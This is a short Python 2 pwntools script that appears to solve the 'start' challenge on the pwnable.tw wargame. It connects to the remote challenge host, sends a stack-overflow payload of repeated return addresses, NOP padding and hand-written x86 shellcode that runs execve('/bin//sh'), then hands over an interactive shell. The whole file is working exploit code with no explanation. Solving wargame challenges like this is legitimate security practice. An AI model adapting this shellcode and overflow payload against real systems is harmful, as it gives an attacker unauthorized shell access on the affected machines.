#!/bin/env python2
from pwn import *

p = remote('ctf.pwnable.tw', 8731)
#p = gdb.debug('./start', 'break *0x0804809c')
#p = gdb.debug('./start')
#for t in range(30):
#p = remote('ctf.pwnable.tw', 8731)

start = p32(0x08048060)
#middle = p32(0xfffe0000)
middle = p32(0x08048066)
shell = '\x90'*10+'\x90\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80'


p.send((start*6+shell).ljust(60, '\x00'))
print repr(shell)

for i in range(255):
	if i < 8:
		s = start*(7+i)+shell[ : 60-4*(i+7)]
	else:
		s = start*6+'\x90'*36
	p.send(s)
	#print repr(s), len(s)
#p.send(start*6+'\x90'*36)

p.send(middle*6+'\xff')
print repr(middle*6)

p.interactive()
